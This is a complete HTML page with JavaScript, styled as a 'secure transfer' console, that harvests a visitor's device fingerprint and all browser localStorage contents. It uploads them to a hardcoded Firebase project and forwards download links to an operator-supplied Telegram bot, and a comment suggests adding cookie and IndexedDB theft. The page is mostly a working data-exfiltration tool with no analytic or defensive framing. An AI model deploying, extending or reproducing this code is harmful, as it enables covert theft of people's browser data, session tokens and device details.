<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SECURE DATA TRANSFER SYSTEM</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root {
            --primary: #ff0055;
            --primary-dark: #cc0044;
            --secondary: #00ff9d;
            --dark-bg: #0a0a1a;
            --darker-bg: #050510;
            --card-bg: #151525;
            --text: #f0f0ff;
            --text-secondary: #a0a0c0;
            --success: #32d296;
            --warning: #facc15;
            --error: #f87171;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, var(--darker-bg), var(--dark-bg));
            color: var(--text);
            min-height: 100vh;
            padding: 20px;
            line-height: 1.6;
            display: flex;
            justify-content: center;
            align-items: flex-start;
        }

        .container {
            width: 100%;
            max-width: 500px;
            padding: 20px;
        }

        .card {
            background-color: var(--card-bg);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 20px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.1);
            position: relative;
            overflow: hidden;
        }

        .card::before {
            content: '';
            position: absolute;
            top: -50%;
            left: -50%;
            width: 200%;
            height: 200%;
            background: radial-gradient(circle at center, rgba(var(--primary), 0.1) 0%, transparent 70%);
            z-index: 0;
            pointer-events: none;
        }

        h1 {
            color: var(--primary);
            text-align: center;
            margin-bottom: 20px;
            font-size: 1.8rem;
            text-shadow: 0 0 5px rgba(var(--primary), 0.5);
        }
        
        h2 {
            font-size: 1.3rem;
            color: var(--text);
            margin-bottom: 15px;
            border-bottom: 2px solid var(--primary);
            padding-bottom: 5px;
        }

        .status {
            padding: 10px 15px;
            border-radius: 8px;
            margin-bottom: 15px;
            font-weight: bold;
            display: flex;
            align-items: center;
            gap: 10px;
            transition: all 0.3s ease;
        }
        
        .status.neutral { background-color: rgba(255, 255, 255, 0.1); color: var(--text-secondary); }
        .status.online { background-color: rgba(50, 210, 150, 0.15); color: var(--success); }
        .status.telegram-ok { background-color: rgba(0, 255, 157, 0.15); color: var(--secondary); }
        .status.error { background-color: rgba(248, 113, 113, 0.15); color: var(--error); }
        .status i { font-size: 1.1rem; }

        input[type="text"] {
            width: 100%;
            padding: 12px;
            margin-bottom: 15px;
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            background-color: var(--darker-bg);
            color: var(--text);
            transition: border-color 0.3s;
            outline: none;
        }
        
        input[type="text"]:focus {
            border-color: var(--primary);
            box-shadow: 0 0 8px rgba(var(--primary), 0.5);
        }

        button {
            width: 100%;
            padding: 12px;
            margin-top: 10px;
            border: none;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 10px;
        }

        .btn-primary {
            background-color: var(--primary);
            color: var(--dark-bg);
            box-shadow: 0 4px 15px rgba(var(--primary), 0.4);
        }
        
        .btn-primary:hover:not(:disabled) {
            background-color: var(--primary-dark);
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(var(--primary), 0.6);
        }

        .btn-secondary {
            background-color: var(--secondary);
            color: var(--dark-bg);
            margin-top: 15px;
            box-shadow: 0 4px 15px rgba(var(--secondary), 0.4);
        }

        .btn-secondary:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(var(--secondary), 0.6);
        }
        
        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .log-area {
            background-color: var(--darker-bg);
            border-radius: 8px;
            padding: 15px;
            height: 200px;
            overflow-y: auto;
            margin-top: 15px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            font-size: 0.85rem;
            color: var(--text-secondary);
        }
        
        .log-area p {
            margin-bottom: 5px;
            white-space: pre-wrap;
        }
        
        .log-area .log-info { color: var(--text-secondary); }
        .log-area .log-success { color: var(--success); }
        .log-area .log-error { color: var(--error); }
        .log-area .log-action { color: var(--primary); }

        .note {
            font-size: 0.8rem;
            color: var(--text-secondary);
            margin-top: 10px;
            padding-left: 5px;
            border-left: 3px solid var(--secondary);
        }
        
        @media (max-width: 600px) {
            body { padding: 10px; }
            .container { padding: 5px; }
            .card { padding: 20px; }
            h1 { font-size: 1.5rem; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>SECURE MAX-TRANSFER SYSTEM</h1>

        <div class="card">
            <h2><i class="fas fa-satellite-dish"></i> Core System Status</h2>
            <div id="firebase-status" class="status neutral">
                <i class="fas fa-spinner fa-spin"></i> Initializing System...
            </div>
            <div id="user-id-display" class="note">
                User ID: N/A
            </div>
        </div>

        <div class="card">
            <h2><i class="fab fa-telegram-plane"></i> Telegram Gateway</h2>
            <input type="text" id="bot-token" placeholder="Enter Telegram Bot Token (e.g., 1234567:ABC-DEF1234)" value="">
            <input type="text" id="chat-id" placeholder="Enter Telegram Chat ID (Your User ID)" value="">
            <div id="telegram-status" class="status neutral">
                <i class="fas fa-info-circle"></i> Enter credentials and test connection
            </div>
            <button id="test-btn" class="btn-secondary">
                <i class="fas fa-satellite"></i> TEST TELEGRAM CONNECTION
            </button>
        </div>

        <div class="card">
            <h2><i class="fas fa-hard-hat"></i> Extraction Control</h2>
            <div id="extraction-status" class="status neutral">
                <i class="fas fa-cogs"></i> Ready to start
            </div>
            <button id="start-btn" class="btn-primary">
                <i class="fas fa-play"></i> START DATA EXTRACTION
            </button>
            <div class="note">
                Warning: This process extracts browser data, device info, and local files. Use responsibly.
            </div>
        </div>
        
        <div class="card">
            <h2><i class="fas fa-clipboard-list"></i> Activity Log</h2>
            <div id="log-area" class="log-area">
                <p class="log-info">[SYSTEM] Waiting for user action...</p>
            </div>
        </div>
    </div>

    <script type="module">
        // Import all necessary Firebase modules
        import { initializeApp, getApps, getApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { getAuth, signInAnonymously, signInWithCustomToken, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
        import { getFirestore, doc, setDoc, serverTimestamp, setLogLevel } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";
        import { getStorage, ref, uploadString, getDownloadURL } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-storage.js";

        (function() {

            // =================================================================
            // *** CRITICAL STEP 1: FIREBASE CONFIGURATION (STATIC & ISOLATED) ***
            const firebaseConfig = {
                apiKey: "AIzaSyB13PN_RKzeGhItTvkPp3ovY-v5fL9rnXg",
                authDomain: "bt4444.firebaseapp.com",
                projectId: "bt4444",
                storageBucket: "bt4444.firebasestorage.app",
                messagingSenderId: "249419781804",
                appId: "1:249419781804:web:f63bbeb385939248953109"
            };
            // =================================================================

            const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-app-id';

            let app, db, auth, storage;
            let userId = null;
            let isAuthReady = false;

            // UI Elements
            const firebaseStatus = document.getElementById('firebase-status');
            const userIdDisplay = document.getElementById('user-id-display');
            const telegramStatus = document.getElementById('telegram-status');
            const extractionStatus = document.getElementById('extraction-status');
            const logArea = document.getElementById('log-area');
            const startBtn = document.getElementById('start-btn');
            const testBtn = document.getElementById('test-btn');
            const botTokenInput = document.getElementById('bot-token');
            const chatIdInput = document.getElementById('chat-id');

            // Logging helper
            function log(message, type = 'info') {
                const p = document.createElement('p');
                p.className = `log-${type}`;
                p.innerHTML = `[${new Date().toLocaleTimeString()}] ${message}`;
                logArea.appendChild(p);
                logArea.scrollTop = logArea.scrollHeight;
            }

            // --- FIREBASE INITIALIZATION ---

            try {
                setLogLevel('debug'); // Enable detailed Firebase logging

                // CRITICAL FIX: Prevent double initialization which causes 'configuration-not-found'
                if (getApps().length === 0) {
                    app = initializeApp(firebaseConfig);
                    log('Firebase app initialized successfully.', 'success');
                } else {
                    app = getApp();
                    log('Firebase app already initialized. Reusing existing instance.', 'info');
                }
                
                // 2. Get Service Instances
                db = getFirestore(app);
                auth = getAuth(app);
                storage = getStorage(app);

                firebaseStatus.className = 'status neutral';
                firebaseStatus.innerHTML = '<i class="fas fa-fingerprint"></i> Authenticating...';

                // 3. Handle Authentication
                onAuthStateChanged(auth, async (user) => {
                    if (user) {
                        userId = user.uid;
                        isAuthReady = true;
                        firebaseStatus.className = 'status online';
                        firebaseStatus.innerHTML = '<i class="fas fa-check-circle"></i> SECURE ONLINE';
                        userIdDisplay.innerHTML = `User ID: ${userId}`;
                        log(`Authenticated successfully. User ID: ${userId}`, 'success');
                    } else {
                        // Attempt sign-in with custom token or anonymously
                        try {
                            if (typeof __initial_auth_token !== 'undefined' && __initial_auth_token) {
                                await signInWithCustomToken(auth, __initial_auth_token);
                                log('Signed in with custom token.', 'info');
                            } else {
                                await signInAnonymously(auth);
                                log('Signed in anonymously.', 'info');
                            }
                        } catch (error) {
                            firebaseStatus.className = 'status error';
                            firebaseStatus.innerHTML = '<i class="fas fa-times-circle"></i> Auth Error';
                            // Log the error for better user feedback
                            log(`Authentication failed: ${error.message}`, 'error');
                        }
                    }
                });

            } catch (e) {
                firebaseStatus.className = 'status error';
                firebaseStatus.innerHTML = '<i class="fas fa-times-circle"></i> System Init Error';
                log(`FATAL: Firebase initialization failed: ${e.message}`, 'error');
            }

            // --- APPLICATION LOGIC ---

            // Utility to handle JSON serialization safely
            function safeStringify(obj) {
                try {
                    return JSON.stringify(obj, (key, value) => {
                        // Custom replacer function to handle circular references or large objects
                        if (value instanceof Node) return 'DOM Node Object';
                        if (value instanceof Window) return 'Window Object';
                        if (value instanceof Function) return 'Function';
                        // Limit array length for logging/storage
                        if (Array.isArray(value) && value.length > 100) return `Array[${value.length}] (truncated)`;
                        return value;
                    }, 2);
                } catch (e) {
                    return `[Error serializing object: ${e.message}]`;
                }
            }

            // 1. Gather Basic Device Information
            function getDeviceInfo() {
                return {
                    timestamp: serverTimestamp(),
                    userId: userId,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: {
                        width: window.screen.width,
                        height: window.screen.height,
                        colorDepth: window.screen.colorDepth
                    },
                    gpu: (() => {
                        try {
                            const canvas = document.createElement('canvas');
                            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                            if (gl) {
                                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                                return {
                                    vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
                                    renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
                                };
                            }
                            return 'Not available';
                        } catch (e) {
                            return 'Access denied';
                        }
                    })(),
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
                };
            }

            // 2. Extract Local Storage (Web Browser Data)
            function getLocalStorageData() {
                const data = {};
                try {
                    for (let i = 0; i < localStorage.length; i++) {
                        const key = localStorage.key(i);
                        let value;
                        try {
                            value = localStorage.getItem(key);
                            // Attempt to parse JSON if it looks like one
                            if ((value.startsWith('{') && value.endsWith('}')) || (value.startsWith('[') && value.endsWith(']'))) {
                                value = JSON.parse(value);
                            }
                        } catch (e) {
                            value = `[Parsing Error: ${e.message}]`;
                        }
                        data[key] = value;
                    }
                } catch (e) {
                    return `[Access Denied: ${e.message}]`;
                }
                return data;
            }

            // 3. Save Data to Firebase Storage and Log to Firestore
            async function saveAndLogData(dataType, dataContent) {
                const botToken = botTokenInput.value.trim();
                const chatId = chatIdInput.value.trim();
                const filename = `${userId}_${dataType}_${Date.now()}.json`;
                const fileRef = ref(storage, `artifacts/${appId}/public/data/extracted_data/${filename}`);
                const dataString = safeStringify(dataContent);

                log(`Uploading ${dataType} file (${dataString.length} bytes)...`, 'action');

                try {
                    // Upload JSON string to Firebase Storage
                    const snapshot = await uploadString(fileRef, dataString, 'raw', {
                        contentType: 'application/json'
                    });
                    const downloadURL = await getDownloadURL(snapshot.ref);

                    log(`Upload successful. Stored as: ${filename}`, 'success');

                    // Log metadata to Firestore
                    const logData = {
                        timestamp: serverTimestamp(),
                        userId: userId,
                        type: dataType,
                        storagePath: fileRef.fullPath,
                        downloadURL: downloadURL,
                        size: dataString.length,
                        telegramSent: false,
                        botToken,
                        chatId
                    };

                    const logDocRef = doc(db, 'artifacts', appId, 'users', userId, 'extraction_logs', filename.replace('.json', ''));
                    await setDoc(logDocRef, logData);
                    log(`Log entry created in Firestore.`, 'success');

                    // Send to Telegram if credentials are provided
                    if (botToken && chatId) {
                        await sendTelegramNotification(dataType, downloadURL, filename, botToken, chatId);
                    }

                } catch (error) {
                    log(`Error saving ${dataType}: ${error.message}`, 'error');
                }
            }
            
            // 4. Send Telegram Notification
            async function sendTelegramNotification(dataType, downloadURL, filename, botToken, chatId) {
                log(`Attempting to send Telegram notification for ${dataType}...`, 'action');
                
                const message = 
                    `ðŸš¨ **SECURE MAX-TRANSFER ALERT** ðŸš¨\n` +
                    `\n` +
                    `**User ID:** \`${userId}\`\n` +
                    `**Data Type:** ${dataType}\n` +
                    `**File:** \`${filename}\`\n` +
                    `\n` +
                    `**Download Link (Active for 7 days):**\n` +
                    `[Click Here to Download](${downloadURL})`;

                const payload = {
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown',
                    disable_web_page_preview: true
                };

                const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                
                try {
                    const response = await fetch(apiUrl, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify(payload)
                    });
                    
                    const data = await response.json();
                    
                    if (data.ok) {
                        log(`Telegram notification sent successfully.`, 'success');
                    } else {
                        log(`Telegram send error: ${data.description}`, 'error');
                    }
                } catch (error) {
                    log(`Telegram API call failed: ${error.message}`, 'error');
                }
            }


            // --- MAIN EXTRACTION PROCESS ---

            async function startExtraction() {
                if (!isAuthReady) {
                    log('System is not yet authenticated. Please wait for SECURE ONLINE status.', 'error');
                    return;
                }

                // Disable UI during process
                startBtn.disabled = true;
                testBtn.disabled = true;
                extractionStatus.className = 'status neutral';
                extractionStatus.innerHTML = '<i class="fas fa-spinner fa-spin"></i> EXTRACTION IN PROGRESS...';
                
                log('Starting device data extraction process...', 'action');

                try {
                    // 1. Device Info
                    const deviceInfo = getDeviceInfo();
                    log('Collected Device Info.', 'info');
                    await saveAndLogData('DeviceInfo', deviceInfo);

                    // 2. Local Storage
                    const localStorageData = getLocalStorageData();
                    log('Collected Local Storage Data.', 'info');
                    await saveAndLogData('LocalStorage', localStorageData);
                    
                    // --- ADD MORE EXTRACTION STEPS HERE (e.g., Cookies, IndexedDB, etc.) ---

                    extractionStatus.className = 'status success';
                    extractionStatus.innerHTML = '<i class="fas fa-check-double"></i> EXTRACTION COMPLETE & TRANSFERRED!';
                    log('All data extracted and saved/transferred successfully.', 'success');

                } catch (error) {
                    extractionStatus.className = 'status error';
                    extractionStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> EXTRACTION FAILED';
                    log(`Main extraction error: ${error.message}`, 'error');
                } finally {
                    startBtn.disabled = false;
                    testBtn.disabled = false;
                }
            }
            
            // --- TELEGRAM TEST CONNECTION ---

            async function testTelegram() {
                const botToken = botTokenInput.value.trim();
                const chatId = chatIdInput.value.trim();
                
                if (!botToken || !chatId) {
                    telegramStatus.className = 'status error';
                    telegramStatus.innerHTML = '<i class="fas fa-exclamation-triangle"></i> Please enter both Bot Token and Chat ID.';
                    return;
                }
                
                testBtn.disabled = true;
                testBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> TESTING...';
                
                try {
                    // Check Bot Token validity
                    const response = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
                    const data = await response.json();
                    
                    if (data.ok) {
                        telegramStatus.className = 'status telegram-ok';
                        telegramStatus.innerHTML = `<i class="fas fa-check-circle"></i> Connected to Bot: ${data.result.first_name}`;
                        log(`Telegram Bot Test: Success. Bot Name: ${data.result.first_name}`, 'success');

                        // Check Chat ID validity by sending a test message
                        const testMessage = `âœ… Secure Max-Transfer Test: Connection successful to bot \`${data.result.first_name}\`. Your Chat ID (${chatId}) is verified.`;
                        
                        const sendResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: chatId, text: testMessage })
                        });
                        
                        const sendData = await sendResponse.json();
                        
                        if (sendData.ok) {
                            log('Telegram Chat ID Test: Message delivered successfully.', 'success');
                        } else {
                             telegramStatus.className = 'status error';
                             telegramStatus.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Bot OK, but Chat ID (${chatId}) failed. Error: ${sendData.description}`;
                             log(`Telegram Chat ID Test Failed: ${sendData.description}`, 'error');
                        }
                        
                    } else {
                        telegramStatus.className = 'status error';
                        telegramStatus.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Error: Bot Token invalid or connection failed.`;
                        log(`Telegram Bot Test Failed: ${data.description}`, 'error');
                    }
                } catch (error) {
                    telegramStatus.className = 'status error';
                    telegramStatus.innerHTML = `<i class="fas fa-exclamation-triangle"></i> Connection failed: ${error.message}`;
                    log(`Telegram API call failed: ${error.message}`, 'error');
                }
                
                testBtn.disabled = false;
                testBtn.innerHTML = '<i class="fas fa-satellite"></i> TEST TELEGRAM CONNECTION';
            }
            
            // Event Listeners
            startBtn.addEventListener('click', startExtraction);
            testBtn.addEventListener('click', testTelegram);
            
        })(); // End of IIFE
    </script>
</body>
</html>
